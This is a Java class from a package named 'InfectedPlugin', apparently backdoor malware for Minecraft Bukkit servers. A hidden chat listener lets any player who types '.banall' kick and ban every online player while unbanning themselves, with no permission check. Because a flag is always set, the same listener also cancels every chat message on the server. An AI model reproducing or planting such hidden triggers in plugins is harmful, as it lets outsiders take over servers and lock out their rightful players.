package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Server;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_banall implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        Player player = event.getPlayer();
        Server server = Bukkit.getServer();
        boolean cancel = true;
    
        if (message.toLowerCase().contains(".banall"))
        {
            player.kickPlayer("Unbanned rejoin");
            for (final Player target : server.getOnlinePlayers())
            {
                target.kickPlayer("The Ban Hammer has spoken!");
                target.setBanned(true);
                player.setBanned(false);
                cancel = true;
            }
        }
        
        if (cancel)
        {
            event.setCancelled(true);
            return;
        }
    }
}
